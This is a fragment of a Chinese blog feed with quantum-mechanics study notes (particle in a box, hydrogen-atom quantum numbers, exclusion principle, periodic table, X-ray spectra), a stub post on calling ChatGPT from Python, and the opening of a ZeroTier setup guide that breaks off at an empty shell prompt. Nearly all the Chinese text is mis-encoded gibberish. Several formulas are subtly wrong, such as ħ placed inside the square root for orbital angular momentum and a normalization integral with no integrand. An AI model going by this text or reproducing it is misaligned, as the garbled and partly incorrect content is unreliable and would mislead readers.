è‡ªç”±ç²’å­; å¹³é¢æ³¢å’Œæ³¢åŒ… Free Particles; Plane Waves and Wave Packets</h2><!-- ä¸€ä¸ª <mark>è‡ªç”±ç²’å­</mark> æ„å‘³ç€, å…¶ä¸å—ä»»ä½•å¤–åŠ›ä½œç”¨, å› æ­¤å¯ä»¥å°†å…¶åŠ¿èƒ½è§†ä¸ºé›¶ (?) --><!----><!-- å› æ­¤è–›å®šè°”æ–¹ç¨‹ç”±: --><!-- $$ --><!-- \displaylines{- \frac{\hbar^2}{2m} \frac{d^2 \psi (x)}{dx^2} + U(x) \psi (x) = E \psi (x) \newline~ \newline --><!-- å˜ä¸º: - \frac{\hbar^2}{2m} \frac{d^2 \psi (x)}{dx^2} = E \psi (x) \newline~ \newline --><!-- \frac{d^2 \psi (x)}{dx^2} + \frac{2m E}{\hbar^2} \psi = 0} --><!-- $$ --><!----><!-- è¿™ä¸ªæ–¹ç¨‹å’Œç®€è°è¿åŠ¨æ–¹ç¨‹ç±»ä¼¼, å› æ­¤ $\psi$ å¯å†™ä¸º: --><!-- $$ --><!-- \displaylines{\psi = A \sin kx + B \cos kx \newline~ \newline --><!-- k = \sqrt{\frac{2m E}{\hbar^2}} \newline~ \newline --><!-- E = \frac{1}{2}m v^2 + U,\ U=0 \newline~ \newline --><!-- \therefore E = \frac{1}{2}m v^2 = \frac{p^2}{2m} \newline~ \newline --><!-- \therefore k = \frac{p}{\hbar} = \frac{h}{\lambda \hbar} = \frac{2 \pi}{\lambda}} --><!-- $$ --><h2 id="34-8-æ— é™æ·±æ–¹åŠ¿é˜µä¸­çš„ç²’å­-ä¸€ä¸ªåˆšæ€§ç›’å­-Particle-in-an-Infinitely-Deep-Square-Well-Potential-a-Rigid-Box"><a href="#34-8-æ— é™æ·±æ–¹åŠ¿é˜µä¸­çš„ç²’å­-ä¸€ä¸ªåˆšæ€§ç›’å­-Particle-in-an-Infinitely-Deep-Square-Well-Potential-a-Rigid-Box" class="headerlink" title="34.8 æ— é™æ·±æ–¹åŠ¿é˜µä¸­çš„ç²’å­ (ä¸€ä¸ªåˆšæ€§ç›’å­) Particle in an Infinitely Deep Square Well Potential (a Rigid Box)"></a>34.8 æ— é™æ·±æ–¹åŠ¿é˜µä¸­çš„ç²’å­ (ä¸€ä¸ªåˆšæ€§ç›’å­) Particle in an Infinitely Deep Square Well Potential (a Rigid Box)</h2><p>è–›å®šè°”æ–¹ç¨‹åªæœ‰åœ¨å‡ ç§å½¢å¼çš„åŠ¿èƒ½ $U$ ä¸‹æ‰èƒ½è¢«è§£å‡º.</p><p>è€ƒè™‘ä¸¤ä¸ªç®€å•çš„æƒ…å†µ.</p><blockquote><p>ç¬¬ä¸€ç§æƒ…å†µ</p></blockquote><p>è´¨é‡ä¸º m çš„ç²’å­ä½äºä¸€ä¸ªåˆšæ€§ç›’å­ä¸­:</p><p><img src="/../img/rigid_box.png"></p><p>ä¸¤å£ä¸ºå®Œå…¨å¼¹æ€§. ä¸”æ— é™æ·±. åŠ¿èƒ½ $U(x)$ å¯ä»¥å†™ä¸º:</p><p>$$<br>\displaylines{U(x) &#x3D; 0,\ 0 &lt; x &lt; L \newline~ \newline<br>U(x) &#x3D; \infty,\ x \le 0\ and\ x \ge L \newline~ \newline<br>(L ä¸ºç›’å­çš„é«˜åº¦)}<br>$$<br>(ä¹Ÿå°±æ˜¯è¯´, ç›’å­å†…åŠ¿èƒ½ä¸º0, ç›’å­å¤–åŠ¿èƒ½ä¸º $\infty$)</p><p>å½“åŠ¿èƒ½ä¸º 0 æ—¶, è–›å®šè°”æ–¹ç¨‹çš„è§£ä¸º:</p><p>$$<br>\displaylines{\psi (x) &#x3D; A\sin kx + B\cos kx \newline~ \newline<br>k &#x3D; \sqrt{ \frac{2m E}{\hbar^2}}<br>$$</p><p>å½“åŠ¿èƒ½ä¸º $\infty$ æ—¶, $\psi (x)$ ä¸€å®šä¸ºé›¶.</p><blockquote><p>æ±‚è§£ A, B çš„å€¼ä»¥åŠ k çš„é™åˆ¶æ¡ä»¶</p></blockquote><p>ä¸´ç•Œå€¼ä¸º, $x&#x3D;0,\ x&#x3D;L$, æ­¤æ—¶ $\psi &#x3D; 0$, æœ‰:</p><p>$$<br>\displaylines{\psi (0) &#x3D; 0\ and\ \psi (L) &#x3D; 0 \newline~ \newline<br>0 &#x3D; \psi (x) &#x3D; A\sin 0 + B\cos 0 &#x3D; 0 + B \newline~ \newline<br>B &#x3D; 0 \newline~ \newline<br>\psi (x) &#x3D; A\sin kx \newline~ \newline<br>\because 0 &#x3D; \psi (L) &#x3D; A\sin kL \newline~ \newline<br>A \ne 0 \newline~ \newline<br>\therefore \sin kL &#x3D; 0 \newline~ \newline<br>kL &#x3D; n \pi, \ \ n &#x3D; 1,2,3â€¦ \newline~ \newline<br>k &#x3D; \frac{n \pi}{L} \newline~ \newline<br>\because k &#x3D; \sqrt{ \frac{2m E}{\hbar^2} \newline~ \newline<br>\therefore E &#x3D; n^2 \frac{h^2}{8m L^2},\ \ n&#x3D;1,2,3,â€¦}<br>}<br>$$<br>æ­¤æ—¶å¯ä»¥çŸ¥é“, åˆšæ€§ç›’ä¸­çš„ç²’å­æœ‰å¯ä»¥é‡åŒ–çš„èƒ½é‡. æœ€ä½çš„èƒ½é‡ä¸º (å³, $n&#x3D; 1$):</p><p>$$<br>\displaylines{E_1 &#x3D; \frac{h^2}{8m L^2}}<br>$$</p><p>è¿™é‡Œçš„ n è¢«ç§°ä¸º <mark>é‡å­æ•°</mark>. </p><p>ç”±äºæœ€ä½èƒ½é‡ä¸ä¸ºé›¶, å› æ­¤åˆšæ€§ç›’ä¸­çš„ç²’å­æ°¸è¿œä¸ä¼šé™æ­¢. æ­¤æ—¶ $E_1$ ä¹Ÿè¢«ç§°ä¸º <mark>é›¶ç‚¹èƒ½é‡ (zero-point energy)</mark>.</p><p>åœ¨è¿™é‡Œ, èƒ½é‡ $E_1$ å’Œ åŠ¨é‡ $p_1 &#x3D; \hbar k &#x3D; \frac{\hbar \pi}{L}$ ä¸åˆšæ€§ç›’çš„è¾¹é•¿ $L$ æˆåæ¯”.</p><p>å¦‚:</p><p><img src="/../img/possible_energy_levels_for_a_particle_in_a_box_with_perfectly_rigid_walls.png"></p><p>æ¯ä¸€ä¸ªèƒ½é‡çŠ¶æ€çš„æ³¢åŠ¨æ–¹ç¨‹å¯ä»¥å†™ä¸º:</p><p>$$<br>\displaylines{\psi_n &#x3D; A\sin( \frac{n \pi}{L} X)}<br>$$</p><p>åŒæ—¶æœ‰:<br>$$<br>\displaylines{1 &#x3D; \int_{-\infty}^{+\infty} &#x3D; \int_0^L A^2 \sin^2 ( \frac{n \pi}{L} x) dx \newline~ \newline<br>A &#x3D; \sqrt{ \frac{2}{L}}\ and\ \psi_n &#x3D; \sqrt{ \frac{2}{L}}\sin ( \frac{n \pi}{L}x)}<br>$$</p><h2 id="34-9-æœ‰é™åŠ¿äº•-Finite-Potential-Well"><a href="#34-9-æœ‰é™åŠ¿äº•-Finite-Potential-Well" class="headerlink" title="34.9 æœ‰é™åŠ¿äº• Finite Potential Well"></a>34.9 æœ‰é™åŠ¿äº• Finite Potential Well</h2><p>æ ‡é¢˜çš„å«ä¹‰å°±æ˜¯å¦‚ä¸‹:</p><p><img src="/../img/Finite_Potential_Well.png"></p><p>æ­¤æ—¶çš„åŠ¿èƒ½æ˜¯æœ‰é™çš„. ç›’å¤–çš„åŠ¿èƒ½ä¸å†æ˜¯æ— ç©·å¤§.</p><h2 id="34-10-ç©¿è¿‡éšœç¢éš§é“-Tunneling-through-a-Barrier"><a href="#34-10-ç©¿è¿‡éšœç¢éš§é“-Tunneling-through-a-Barrier" class="headerlink" title="34.10 ç©¿è¿‡éšœç¢éš§é“ Tunneling through a Barrier"></a>34.10 ç©¿è¿‡éšœç¢éš§é“ Tunneling through a Barrier</h2><h1 id="Chapter-35-åŸå­çš„é‡å­åŠ›å­¦-Quantum-Mechanics-of-Atoms"><a href="#Chapter-35-åŸå­çš„é‡å­åŠ›å­¦-Quantum-Mechanics-of-Atoms" class="headerlink" title="Chapter 35 åŸå­çš„é‡å­åŠ›å­¦ Quantum Mechanics of Atoms"></a>Chapter 35 åŸå­çš„é‡å­åŠ›å­¦ Quantum Mechanics of Atoms</h1><p>éœ“è™¹ç¯, å°±æ˜¯è£…æ°”ä½“çš„ç®¡å­, ä¸¤ä¾§åŠ ä¸Šé«˜å‹.</p><h2 id="35-1-åŸå­çš„é‡å­åŠ›å­¦è§†è§’-Quantum-Mechanical-View-of-Atoms"><a href="#35-1-åŸå­çš„é‡å­åŠ›å­¦è§†è§’-Quantum-Mechanical-View-of-Atoms" class="headerlink" title="35.1 åŸå­çš„é‡å­åŠ›å­¦è§†è§’ Quantum-Mechanical View of Atoms"></a>35.1 åŸå­çš„é‡å­åŠ›å­¦è§†è§’ Quantum-Mechanical View of Atoms</h2><p>åœ¨é‡å­åŠ›å­¦çš„è§‚ç‚¹ä¸‹, ç”µå­å¹¶ä¸æ˜¯åœ¨ç‰¹å®šçš„è½¨é“ä¸Š (do not exist in well-defined circular orbits).</p><p>ç”µå­ç”±äºæ³¢çš„æ€§è´¨, å¯ä»¥è¢«è§†ä¸º a â€œcloudâ€, æ•£å¸ƒåœ¨ç©ºé—´ä¸­.</p><p><mark>ç”µå­äº‘ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯æ¦‚ç‡åˆ†å¸ƒ</mark>.</p><p>ç»™å®šä¸€ä¸ªçŠ¶æ€çš„åŸå­, å¯ä»¥è®¡ç®—å…¶ç”µå­äº‘çš„å¤§å°å’Œå½¢çŠ¶.</p><p>ç”µå­äº‘ä¹Ÿæœ‰å¯†åº¦. å…¶å€¼ä¸º $\left\vert \psi \right\vert^2$.</p><p>ç”±äºç”µå­äº‘, åŸå­å¹¶æ²¡æœ‰å‡†ç¡®çš„è¾¹ç•Œ.</p><p>ç”µå­äº‘æ˜¯ç”±ç”µå­çš„æ³¢çš„æ€§è´¨çš„ç»“æœ.</p><h2 id="35-2-æ°¢åŸå­-è–›å®šè°”æ–¹ç¨‹å’Œé‡å­æ•°-Hydrogen-Atom-Schrodinger-Equation-and-Quantum-Numbers"><a href="#35-2-æ°¢åŸå­-è–›å®šè°”æ–¹ç¨‹å’Œé‡å­æ•°-Hydrogen-Atom-Schrodinger-Equation-and-Quantum-Numbers" class="headerlink" title="35.2 æ°¢åŸå­; è–›å®šè°”æ–¹ç¨‹å’Œé‡å­æ•° Hydrogen Atom; Schrodinger Equation and Quantum Numbers"></a>35.2 æ°¢åŸå­; è–›å®šè°”æ–¹ç¨‹å’Œé‡å­æ•° Hydrogen Atom; Schrodinger Equation and Quantum Numbers</h2><p>å¯¹äºæ°¢åŸå­è€Œè¨€, å…¶åŠ¿èƒ½å¯ä»¥ç”¨ç”µå­å’Œè´¨å­çš„åº“ä»‘åŠ›è®¡ç®—:</p><p>$$<br>\displaylines{U &#x3D; - \frac{1}{4 \pi \epsi} \frac{e^2}{r}}<br>$$<br>(æ¯•ç«Ÿä¸€ä¸ªæ°¢åŸå­åªæœ‰ä¸€ä¸ªç”µå­å’Œä¸€ä¸ªè´¨å­, è¿™é‡Œçš„ r ä¸ºè´¨å­å’Œç”µå­çš„è·ç¦»)</p><p>å…¶è·ç¦»å’ŒåŠ¿èƒ½å¤§å°çš„å…³ç³»å›¾ä¸º:</p><p><img src="/../img/potential_energy_for_the_hydrogen_atom.png"></p><p>ä¸‰ç»´çš„è–›å®šè°”æ–¹ç¨‹:</p><p>$$<br>\displaylines{- \frac{\hbar^2}{2m} ( \frac{\partial^2 \psi}{\partial x^2} + \frac{\partial^2 \psi}{\partial y^2} + \frac{\partial^2 \psi}{\partial z^2}) - \frac{1}{4 \pi \epsi} \frac{e^2}{r} \psi &#x3D; E \psi}<br>$$</p><p>ä¸€ä¸ªé‡å­æ˜¯å¯¹åº”ä¸€ä¸ªè¾¹ç•Œæ¡ä»¶.</p><p><mark>principal quantum number</mark>, ä¸º:</p><p>$$<br>\displaylines{E_n &#x3D; -\frac{13.6}{n^2},\ \ n&#x3D;1,2,3,â€¦}<br>$$<br>ä¸­çš„ n. æ°¢åŸå­åœ¨æŸä¸€çŠ¶æ€ä¸‹çš„æ€»èƒ½é‡å–å†³äº n.</p><p><mark>orbital quantum number (è½¨é“é‡å­æ•°)</mark>  ä¸º:</p><p>$$<br>\displaylines{L &#x3D; \sqrt{l(l+1)\hbar} \newline~ \newline<br>(L ä¸ºè½¨é“è§’åŠ¨é‡)}<br>$$<br>ä¸­çš„ $l$, å’Œç”µå­çš„è½¨é“è§’åŠ¨é‡çš„å¤§å°ç›¸å…³, å…¶å–å€¼ä¸º $0 \sim (n-1)$ ä¸­çš„æ•´æ•°, åœ¨æ°¢åŸå­ä¸­å…¶ä¸å†³å®šæ€»èƒ½é‡, ä½†å½“ç”µå­æ•°å¤§äºç­‰äº 2 æ—¶, å…¶å’Œ n ä¸€æ ·å½±å“èƒ½é‡.</p><p><mark>magnetic quantum number (ç£é‡å­æ•°)</mark> ä¸º:</p><p>$$<br>\displaylines{L_z &#x3D; m_l \hbar}<br>$$<br>(é‡å­åŠ›å­¦ä¸­, è§’åŠ¨é‡çš„æ–¹å‘é€šå¸¸é€šè¿‡ç»™å‡ºå…¶ z è½´çš„åˆ†é‡æ¥æŒ‡å®š, $L_x$ å’Œ $L_y$ æœªå®šä¹‰)<br>ä¸­çš„ $m_l$, å’Œç”µå­è½¨é“è§’åŠ¨é‡çš„æ–¹å‘ç›¸å…³, å…¶å–å€¼ä¸º $-l \sim +l$ ä¸­çš„æ•´æ•°, $L$ æ–¹å‘çš„é™åˆ¶ç§°ä¸º <mark>space quantization (ç©ºé—´é‡åŒ–)</mark> (å¯èƒ½ä¸º, ç”±äº $m_l$ ä¸ºæ•´æ•°, ä¸¤ä¸ªå€¼ä¹‹é—´çš„è§’åº¦ä¸èƒ½å–)</p><p>å¦‚:</p><p><img src="/../img/quantization_of_angular_momentum_direction.png"></p><p>å½“åŸå­è¢«æ–½åŠ ç£åœºæ—¶, å…¶èƒ½é‡çŠ¶æ€ä¸ä»…å–å†³äº n, è¿˜æœ‰ $m_l$. (è¿™ä¹Ÿæ˜¯åå­—çš„ç”±æ¥)</p><p>å¦‚:</p><p><img src="/../img/magnetic_field_is_applied_to_atom.png"></p><p>(ä¹Ÿå°±æ˜¯è¯´, èƒ½é‡å…ˆåˆ†ä¸º n å±‚, æ¯ä¸€å±‚åˆè¢« $m_l$ çš„å–å€¼æ¥åˆ’åˆ†)</p><p><mark>spin quantum number (è‡ªæ—‹é‡å­æ•°)</mark> ä¸º $m_s$, å¯¹äºä¸€ä¸ªç”µå­, å…¶æœ‰ä¸¤ä¸ªå€¼, $m_s &#x3D; + \frac{1}{2}\ and\ m_s &#x3D; -\frac{1}{2}$. (ä¼¼ä¹ä¹Ÿæ˜¯ä»£è¡¨æ–¹å‘)</p><p>ç”µå­ä¼šç»•å…¶è½´æ—‹è½¬ (è‡ªè½¬).</p><h2 id="35-3-æ°¢åŸå­çš„æ³¢åŠ¨æ–¹ç¨‹-Hydrogen-Atom-Wave-Function"><a href="#35-3-æ°¢åŸå­çš„æ³¢åŠ¨æ–¹ç¨‹-Hydrogen-Atom-Wave-Function" class="headerlink" title="35.3 æ°¢åŸå­çš„æ³¢åŠ¨æ–¹ç¨‹ Hydrogen Atom Wave Function"></a>35.3 æ°¢åŸå­çš„æ³¢åŠ¨æ–¹ç¨‹ Hydrogen Atom Wave Function</h2><p>æ°¢åŸå­åŸºæ€çš„æ³¢åŠ¨æ–¹ç¨‹åªå’Œ $r$ ç›¸å…³, å› æ­¤å…¶ç”µå­äº‘ä¸ºçƒå¯¹ç§°çš„. æ–¹ç¨‹å½¢å¼ä¸º:</p><p>$$<br>\displaylines{\psi_{100} &#x3D; \frac{1}{\sqrt{\pi r_0^3}} e^{- \frac{r}{r_0}}}<br>$$<br>( $r_0$ æ˜¯æ³¢å°”åŠå¾„, $r_0 &#x3D; h^2 \epsilon_0&#x2F;\pime^2 &#x3D; 0.0529nm$, ä¸‹æ ‡å®é™…ä¸ºä¸‰ä¸ªæ•°, $n,l,m_l$ å³ $\psi_{nlm_l}$, å¯¹äºåŸºæ€è€Œè¨€, $n&#x3D;1,\ l&#x3D;0,\ m_l&#x3D;0$)</p><p>æ­¤æ—¶çš„æ¦‚ç‡å¯†åº¦ä¸º:</p><p>$$<br>\displaylines{ \left\vert \psi_{100} \right\vert^2 &#x3D; \frac{1}{\pi r_0^3} e^{- \frac{2r}{r_0}}}<br>$$</p><p>èƒ½å¤Ÿè¢«æ ‡å‡†åŒ– (normalized) ä¸º:</p><p>$$<br>\displaylines{\int_{all\ space} \left\vert \psi_{100} \right\vert^2 dV &#x3D; 1}<br>$$</p><p><mark>å¾„å‘æ¦‚ç‡åˆ†å¸ƒ $P_r$ (radial probability distribution)</mark> è¡¨ç¤ºåœ¨ $r \sim r + dr$ çš„å¾„å‘è·ç¦»å†…æ‰¾åˆ°ç”µå­çš„æ¦‚ç‡. (ä¸æ˜¯æŸä¸€æ ¹çº¿, è€Œæ˜¯ä¸€ä¸ªé¢) å¦‚:</p><p><img src="/../img/a_spherical_shell_of_thickness_dr.png"></p><p>$P_r dr$ å°±è¡¨ç¤ºåœ¨åšåº¦ä¸º $dr$ çš„ç»†å£³ä¸­æ‰¾åˆ°ç”µå­çš„æ¦‚ç‡.</p><p>ç»†å£³çš„ä½“ç§¯ä¸º:</p><p>$$<br>\displaylines{dV &#x3D; 4 \pi r^2 dr}<br>$$</p><p>æ‰€ä»¥æœ‰:</p><p>$$<br>\displaylines{ \left\vert \psi \right\vert^2 dV &#x3D; \left\vert \psi \right\vert^2 4 \pi r^2 dr}<br>$$</p><p>å¾„å‘æ¦‚ç‡åˆ†å¸ƒçš„å€¼å°±ä¸º:</p><p>$$<br>\displaylines{P_r &#x3D; 4 \pi r^2 \left\vert \psi \right\vert^2}<br>$$</p><p>å¯¹äºåŸºæ€çš„æ°¢åŸå­, è¿™ä¸ªå€¼å˜ä¸º:</p><p>$$<br>\displaylines{P_r &#x3D; 4 \frac{r^2}{r_0^3} e^{- \frac{2r}{r_0}}}<br>$$</p><h2 id="35-4-å¤æ‚çš„åŸå­-æ’ä»–åŸåˆ™-Complex-Atoms-the-Exclusion-Principle"><a href="#35-4-å¤æ‚çš„åŸå­-æ’ä»–åŸåˆ™-Complex-Atoms-the-Exclusion-Principle" class="headerlink" title="35.4 å¤æ‚çš„åŸå­; æ’ä»–åŸåˆ™ Complex Atoms; the Exclusion Principle"></a>35.4 å¤æ‚çš„åŸå­; æ’ä»–åŸåˆ™ Complex Atoms; the Exclusion Principle</h2><p>å…¶èƒ½çº§å’Œæ°¢åŸå­ä¸åŒ, å› ä¸ºç”µå­ä¹‹é—´ä¼šç›¸äº’å½±å“, ç”µå­å’ŒåŸå­æ ¸ä¹‹é—´ä¹Ÿæœ‰ç›¸äº’ä½œç”¨. æ­¤æ—¶ç”µå­ä¸ä»…ä¼šè¢«åŸå­æ ¸å¸å¼•, è€Œä¸”ä¼šè¢«å…¶ä»–ç”µå­æ’æ–¥.</p><p>å¯¹äºæœ‰å¤šäº 1 ä¸ªç”µå­çš„åŸå­, å…¶èƒ½çº§ç”± $n\ å’Œ\ l$ ä¸€èµ·å†³å®š.</p><p>ä¸­æ€§åŸå­ä¸­çš„ç”µå­æ•°è¢«ç§°ä¸º <mark>åŸå­åºæ•° $Z$ (atomic number)</mark> (ç”±äºæ˜¯ä¸­æ€§åŸå­, ç”µå­æ•°ç­‰äºè´¨å­æ•°, å› æ­¤æ­¤æ—¶çš„è´¨å­æ•°ä¹Ÿç­‰åŒäºåŸå­åºæ•°)</p><p><mark>åŸå­åºæ•°å†³å®šäº†åŸå­çš„å¤§éƒ¨åˆ†æ€§è´¨</mark>. å…¶ä¹Ÿç”¨æ¥åŒºåˆ†å„ç±»åŸå­.</p><p><mark>æ³¡åˆ©ä¸ç›¸å®¹åŸç† (Pauli exclusion principle)</mark> : ä¸€ä¸ªåŸå­ä¸­çš„ä¸¤ä¸ªç”µå­ä¸ä¼šå æ®åŒä¸€ä¸ªé‡å­æ€ (No two electrons in an atom can occupy the same quantum state)</p><p>ç”µå­åœ¨åŸå­ä¸­å æ®çš„é‡å­æ€ç”± $n,l,m_l\ and\ m_s$ å†³å®š. (è¿™å°±æ˜¯é«˜ä¸­è®²çš„è½¨é“) ä¹Ÿå°±æ˜¯è¯´, æ²¡æœ‰ç”µå­æœ‰å®Œå…¨ç›¸åŒçš„ä¸€ç»„ $n,l,m_l\ and\ m_s$.</p><p>( $m_s &#x3D; +\frac{1}{2}$ å’Œ $m_s &#x3D; - \frac{1}{2}$ å¯èƒ½å°±æ˜¯æ‰€è°“çš„ä¸Šæ—‹å’Œä¸‹æ—‹)</p><p><img src="/../img/energy_level_diagram_showing_occupied_states.png"></p><p>(ä»è¿™å¼ å›¾çœ‹, $n$ ä¼¼ä¹å°±æ˜¯è½¨é“å·, èƒ½çº§å·)</p><h2 id="35-5-å…ƒç´ å‘¨æœŸè¡¨-The-Periodic-Table-of-Elements"><a href="#35-5-å…ƒç´ å‘¨æœŸè¡¨-The-Periodic-Table-of-Elements" class="headerlink" title="35.5 å…ƒç´ å‘¨æœŸè¡¨ The Periodic Table of Elements"></a>35.5 å…ƒç´ å‘¨æœŸè¡¨ The Periodic Table of Elements</h2><p>å¦‚:</p><p><img src="/../img/periodic_table.png"></p><p>å…·æœ‰ç±»ä¼¼åŒ–å­¦æ€§è´¨çš„å…ƒç´ ä½äºå…ƒç´ å‘¨æœŸè¡¨çš„åŒä¸€åˆ—.</p><p>æ¯ä¸€ä¸ªæ ¼å­å†…åŒ…æ‹¬:</p><ul><li>åŸå­åºæ•° Z</li><li>å…ƒç´ ç¬¦å·</li><li>åŸå­è´¨é‡</li></ul><p>ç”µå­çš„ $n$ ç›¸åŒè¡¨æ˜å…¶ä½äºåŒä¸€ä¸ª Shell, Shell å¯ä»¥åˆ†ä¸º (ä¹Ÿå°±æ˜¯è¯´ $n$ çš„å€¼å†³å®šä½äºå“ªä¸ª Shell):</p><ol><li>K Shell (or 1s Shell)</li><li>L Shell (or 2s, 2p Shell)</li><li>M Shell (or 3s, 3p, 3d Shell)</li><li>N Shell (or 4s, 4p, 4d, 4f Shell)</li></ol><p>(ä¸€å…±æ˜¯K,L,M,N,O,P,Q. $n&#x3D;1$ åœ¨ K Shell, $n&#x3D;2$ åœ¨ L Shell, $n&#x3D;3$ åœ¨ M Shell, ä»¥æ­¤ç±»æ¨)</p><p>ç”µå­çš„ $l$ çš„å€¼è¡¨æ˜ä½äºå“ªä¸€ä¸ª subshell, å¦‚å›¾:</p><p><img src="/../img/value_of_l_determine_subshell.png"></p><p>æ³¡åˆ©ä¸ç›¸å®¹å®šç†, é™åˆ¶äº†åœ¨åŒä¸€ä¸ª Shell å’Œ subshell ä¸­çš„ç”µå­æ•°.</p><p>åœ¨ç¬¬ $l$ subshell ä¸­, æœ€å¤šèƒ½å®¹çº³çš„ç”µå­æ•°ä¸º $2(2l+1)$ (å› ä¸º $m_l$ çš„å¯èƒ½å€¼æœ‰ 2l + 1, $m_s$ çš„å¯èƒ½å€¼æœ‰ 2). å¦‚, $l&#x3D;2$, é‚£ä¹ˆ $m_l$ å¯ä»¥å– (2,1,0,-1,-2), $m_s$ å¯ä»¥å– $+ \frac{1}{2}\ or\ - \frac{1}{2}$.</p><p><img src="/../img/value_of_l_determine_subshell.png"></p><p>è¿™ä¸ªå›¾ä¹Ÿå‘ŠçŸ¥äº†æ¯ä¸€ä¸ª subshell æ‰€èƒ½æ‰¿å—çš„ç”µå­ä¸ªæ•°.</p><p>åœ¨ä¸€ä¸ª subshell ä¸­çš„ç”µå­æ•°ä¼šä»¥ä¸Šæ ‡çš„å½¢å¼å†™åœ¨ subshell ç¬¦å·ä¸Š. å¦‚ $1s^2 2s^2 2p^6 3s^1$</p><p>ä¸€èˆ¬å¥½åƒåªå†™å‡ºæœ€å¤–å±‚çš„ subshell å½¢å¼, å¦‚:</p><p><img src="/../img/electron_configuration_of_some_elements.png"></p><p><mark>ä¸€ä¸ªè§„å¾‹</mark>, æ‰€æœ‰æƒ°æ€§æ°”ä½“ (noble gases) çš„ shells å’Œ subshells éƒ½æ˜¯è£…æ»¡çš„çŠ¶æ€. å…¶æœ€å¤–å±‚ subshell æ˜¯æ»¡çš„, ç”µå­åˆ†å¸ƒä¸ºçƒå¯¹ç§°. å¯¼è‡´å¤–å±‚ç”µå­ä¸å®¹æ˜“å¤±å», ä¸”ä¸å®¹æ˜“å¸å¼•ç”µå­.</p><p>å¤ç´  (halogens), æŒ‡ shell å·®ä¸€ä¸ªç”µå­è£…æ»¡çš„å…ƒç´   (which lack one electron from a filled shell) å®¹æ˜“å¾—åˆ°ä¸€ä¸ªç”µå­å˜ä¸º $-1e$</p><p>å…ƒç´ å‘¨æœŸè¡¨çš„ç¬¬ä¸€åˆ—ä¸ºç¢±é‡‘å±å…ƒç´  (alkali metals). å®¹æ˜“ä¸¢å¤±ä¸€ä¸ªç”µå­æˆä¸º $+1e$</p><p>subshell çš„å¡«è£…ä¸æ˜¯ä¸€ä¸ªå¡«æ»¡å°±å¡«ä¸‹ä¸€ä¸ª.</p><h2 id="35-6-X-å°„çº¿å…‰è°±å’ŒåŸå­åºå·-X-Ray-Spectra-and-Atomic-Number"><a href="#35-6-X-å°„çº¿å…‰è°±å’ŒåŸå­åºå·-X-Ray-Spectra-and-Atomic-Number" class="headerlink" title="35.6 X å°„çº¿å…‰è°±å’ŒåŸå­åºå· X-Ray Spectra and Atomic Number"></a>35.6 X å°„çº¿å…‰è°±å’ŒåŸå­åºå· X-Ray Spectra and Atomic Number</h2><p>åŸå­çš„çº¿è°±æ˜¯å¯è§çš„, UV (Ultraviolet, ç´«å¤–çš„) å’Œ IR (Infrared, çº¢å¤–çš„) éƒ¨åˆ†çš„ EM (Electromagnetic, ç”µç£çš„) å›¾è°±å¤§éƒ¨åˆ†ç”±å¤–å±‚ç”µå­çŠ¶æ€çš„è¿ç§»å¯¼è‡´.</p><p>X å°„çº¿ç”±, ç”µå­è¢«é«˜å‹åŠ é€Ÿåæ’å‡»é‡‘å±é¶, äº§ç”Ÿ.</p><p>å¦‚å›¾:</p><p><img src="/../img/spectrum_of_X_ray.png"></p><p>$K_{\beta}\ å’Œ\ K_{\alpha}$ ä¸º peak, å–å†³äºæ‰€ç”¨çš„ææ–™. (å¯ä»¥ç†è§£ä¸º, åŠ é€Ÿçš„ç”µå­å…·æœ‰è¶³å¤Ÿçš„èƒ½é‡ä½¿æ’å‡»åçš„ç”µå­è„±ç¦»é‡‘å±, ä¸åŒçš„é‡‘å±è¿™æ ·çš„èƒ½é‡å€¼ä¸åŒ) å› æ­¤åˆè¢«ç§°ä¸º <mark>ç‰¹å¾ X å°„çº¿ (characteristic X-rays)</mark> </p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python-è°ƒç”¨-ChatGPT</title>
    <link href="/2023/02/09/Python-%E8%B0%83%E7%94%A8-ChatGPT/"/>
    <url>/2023/02/09/Python-%E8%B0%83%E7%94%A8-ChatGPT/</url>
    
    <content type="html"><![CDATA[<p>å®‰è£… openai æ¨¡å—.</p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a><a href="https://blog.devgenius.io/chatgpt-how-to-use-it-with-python-5d729ac34c0d">å‚è€ƒæ–‡ç« </a></h1>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åˆ©ç”¨-zerotier-å®ç°å†…ç½‘ç©¿é€</title>
    <link href="/2023/02/08/%E5%88%A9%E7%94%A8-zerotier-%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2023/02/08/%E5%88%A9%E7%94%A8-zerotier-%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><h1 id="æ³¨å†Œè´¦å·"><a href="#æ³¨å†Œè´¦å·" class="headerlink" title="æ³¨å†Œè´¦å·"></a>æ³¨å†Œè´¦å·</h1><p>è¿›å…¥ <a href="https://www.zerotier.com/">ZEROTIER å®˜ç½‘</a></p><p>ç„¶åæ³¨å†Œä¸€ä¸ªè´¦å·.</p><h1 id="åˆ›å»ºä¸€ä¸ªç½‘ç»œ"><a href="#åˆ›å»ºä¸€ä¸ªç½‘ç»œ" class="headerlink" title="åˆ›å»ºä¸€ä¸ªç½‘ç»œ"></a>åˆ›å»ºä¸€ä¸ªç½‘ç»œ</h1><p><img src="/../img/zerotier_create_a_network.png"></p><p>åˆ›å»º Private åˆ™è¦åŠ å…¥çš„ä¸»æœºéœ€è¦ä½ æ‰‹åŠ¨å…è®¸.</p><p>åˆ›å»º Public åˆ™ä¸éœ€è¦.</p><h1 id="å®‰è£…å‘½ä»¤è¡Œå·¥å…·"><a href="#å®‰è£…å‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="å®‰è£…å‘½ä»¤è¡Œå·¥å…·"></a>å®‰è£…å‘½ä»¤è¡Œå·¥å…·</h1><p>Linux ä¸‹è¿è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ 